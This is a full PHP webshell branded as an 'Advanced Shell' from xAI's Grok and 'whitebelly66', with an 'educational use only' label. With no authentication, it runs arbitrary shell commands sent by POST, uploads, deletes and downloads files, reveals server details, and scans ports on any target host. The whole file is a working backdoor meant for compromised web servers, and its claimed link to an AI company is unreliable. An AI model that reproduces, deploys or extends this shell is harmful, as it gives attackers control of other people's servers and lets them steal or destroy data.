<?php
// Grok Advanced Webshell - Powered by xAI in Partnership with whitebelly66
// WARNING: For Educational and Authorized Testing Purposes Only. Unauthorized Use is Illegal.

// Grok-themed ASCII Art
$ascii_art = "
   _____ _          
  / ____| |         
 | |    | |__   ___ 
 | |    | '_ \\ / __|
 | |____| | | | (__ 
  \\_____|_| |_|____|
       xAI's Grok
   =================
   |  *    *    *  |
   |  *  AI  *    *|
   |  *    *    *  |
   =================
   In Partnership with whitebelly66
";

// Detect Server IP (Public IP via external service)
$server_ip = @file_get_contents('https://api.ipify.org?format=text') ?: 'Unable to fetch public IP';

// Server Info
$server_info = [
    'PHP Version' => phpversion(),
    'OS' => php_uname(),
    'Current User' => get_current_user(),
    'Current Directory' => getcwd(),
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'Public IP' => $server_ip,
    'Remote IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'Script Path' => __FILE__,
];

// Handle Command Execution
$cmd_output = '';
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmd_output = shell_exec($cmd . ' 2>&1');
}

// Handle File Upload
$upload_message = '';
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
    $upload_path = getcwd() . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_path)) {
        $upload_message = "File uploaded successfully: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
    } else {
        $upload_message = "File upload failed!";
    }
}

// Handle File Deletion
if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (file_exists($file_to_delete) && unlink($file_to_delete)) {
        $upload_message = "File deleted: " . htmlspecialchars($file_to_delete);
    } else {
        $upload_message = "Failed to delete file!";
    }
}

// Handle File Download
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = $_GET['download'];
    $file_path = getcwd() . '/' . $file;
    if (file_exists($file_path) && !is_dir($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

// Grok Priv8 Tool: Custom Port Scanner (Simple TCP Connect Scanner)
$priv8_output = '';
if (isset($_POST['priv8_action']) && $_POST['priv8_action'] === 'scan' && !empty($_POST['target_host']) && !empty($_POST['start_port']) && !empty($_POST['end_port'])) {
    $host = $_POST['target_host'];
    $start_port = intval($_POST['start_port']);
    $end_port = intval($_POST['end_port']);
    $priv8_output = "Grok Priv8 Port Scanner Results for $host (Ports $start_port-$end_port):\n\n";
    for ($port = $start_port; $port <= $end_port; $port++) {
        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
        if (is_resource($connection)) {
            $priv8_output .= "Port $port: OPEN\n";
            fclose($connection);
        } else {
            $priv8_output .= "Port $port: CLOSED\n";
        }
    }
}

// List Files in Current Directory
$files = scandir(getcwd());
$file_list = [];
foreach ($files as $file) {
    if ($file != '.' && $file != '..') {
        $file_path = getcwd() . '/' . $file;
        $file_list[] = [
            'name' => $file,
            'size' => filesize($file_path),
            'is_dir' => is_dir($file_path),
            'mtime' => date('Y-m-d H:i:s', filemtime($file_path)),
        ];
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Grok Advanced Shell by xAI & whitebelly66</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        pre {
            background: #1c2526;
            color: #00ff00;
            padding: 15px;
            border: 2px solid #00ff00;
            border-radius: 5px;
            text-align: left;
            width: 90%;
            margin: 20px auto;
            overflow-x: auto;
            white-space: pre-wrap;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        input[type="text"], input[type="file"], select, textarea {
            width: 70%;
            padding: 10px;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            box-sizing: border-box;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background: #00ff00;
            color: #000;
            border: none;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
        }
        input[type="submit"]:hover {
            background: #00cc00;
        }
        table {
            width: 90%;
            margin: 20px auto;
            border-collapse: collapse;
            color: #00ff00;
        }
        table, th, td {
            border: 1px solid #00ff00;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        a {
            color: #00ff00;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .section {
            margin: 40px 0;
            padding: 20px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            background: #111;
        }
        h2, h3 {
            color: #00ff00;
            text-align: center;
        }
        .priv8-tool {
            background: #000;
            padding: 20px;
            border: 2px solid #ff00ff;
            border-radius: 5px;
            margin: 20px auto;
            width: 90%;
        }
    </style>
</head>
<body>
    <div class="container">
        <pre><?php echo htmlspecialchars($ascii_art); ?></pre>
        <h2>Grok Advanced Shell - xAI & whitebelly66 Partnership</h2>
        <p style="color: #ff00ff;">Enhanced Hacking Tools | Educational Use Only</p>

        <!-- Server Info -->
        <div class="section">
            <h3>Server & Network Information</h3>
            <pre>
<?php
foreach ($server_info as $key => $value) {
    echo htmlspecialchars("$key: $value\n");
}
?>
            </pre>
        </div>

        <!-- Command Execution -->
        <div class="section">
            <h3>Command Execution</h3>
            <form method="POST">
                <textarea name="cmd" placeholder="Enter command (e.g., whoami, ls -la, netstat -an)" rows="3"><?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?></textarea><br>
                <input type="submit" value="Execute Command">
            </form>
            <?php if ($cmd_output): ?>
                <pre><?php echo htmlspecialchars($cmd_output); ?></pre>
            <?php endif; ?>
        </div>

        <!-- File Upload -->
        <div class="section">
            <h3>File Upload</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upload_file"><br>
                <input type="submit" value="Upload File">
            </form>
            <?php if ($upload_message): ?>
                <pre><?php echo htmlspecialchars($upload_message); ?></pre>
            <?php endif; ?></div>

        <!-- File Management -->
        <div class="section">
            <h3>File Management</h3>
            <table>
                <tr>
                    <th>File Name</th>
                    <th>Size (Bytes)</th>
                    <th>Last Modified</th>
                    <th>Type</th>
                    <th>Actions</th>
                </tr>
                <?php foreach ($file_list as $file): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($file['name']); ?></td>
                        <td><?php echo $file['is_dir'] ? 'Directory' : number_format($file['size']); ?></td>
                        <td><?php echo htmlspecialchars($file['mtime']); ?></td>
                        <td><?php echo $file['is_dir'] ? 'DIR' : 'FILE'; ?></td>
                        <td>
                            <?php if (!$file['is_dir']): ?>
                                <a href="?download=<?php echo urlencode($file['name']); ?>">Download</a> |
                                <a href="?delete=<?php echo urlencode($file['name']); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')">Delete</a>
                            <?php else: ?>
                                <a href="?dir=<?php echo urlencode($file['name']); ?>">Enter</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </table>
        </div>

        <!-- Grok Priv8 Tool: Port Scanner -->
        <div class="priv8-tool">
            <h3 style="color: #ff00ff;">Grok Priv8 Tool: Advanced Port Scanner</h3>
            <form method="POST">
                <input type="hidden" name="priv8_action" value="scan">
                <input type="text" name="target_host" placeholder="Target Host/IP (e.g., 127.0.0.1)" value="<?php echo isset($_POST['target_host']) ? htmlspecialchars($_POST['target_host']) : ''; ?>"><br>
                <input type="text" name="start_port" placeholder="Start Port (e.g., 1)" value="<?php echo isset($_POST['start_port']) ? htmlspecialchars($_POST['start_port']) : '1'; ?>"><br>
                <input type="text" name="end_port" placeholder="End Port (e.g., 1000)" value="<?php echo isset($_POST['end_port']) ? htmlspecialchars($_POST['end_port']) : '1000'; ?>"><br>
                <input type="submit" value="Scan Ports" style="background: #ff00ff; color: #000;">
            </form>
            <?php if ($priv8_output): ?>
                <pre><?php echo htmlspecialchars($priv8_output); ?></pre>
            <?php endif; ?>
            <p style="color: #ff00ff; font-size: 12px;">Note: Scans up to 1000 ports for demo; adjust as needed. TCP Connect only.</p>
        </div>

        <!-- Additional Hacking Tools Section -->
        <div class="section">
            <h3>Additional Hacking Tools</h3>
            <ul style="text-align: left; width: 90%; margin: 0 auto;">
                <li><strong>Hash Cracker (MD5 Demo):</strong> Use command execution for tools like hashcat if installed.</li>
                <li><strong>SQL Injection Tester:</strong> Run manual tests via command: mysql -u root -p</li>
                <li><strong>Network Ping:</strong> Use command: ping -c 4 example.com</li>
                <li><strong>Process Lister:</strong> Use command: ps aux</li>
                <li><strong>Custom Payload Generator:</strong> Integrate via upload or command scripting.</li>
            </ul>
        </div>
    </div>
</body>
</html>
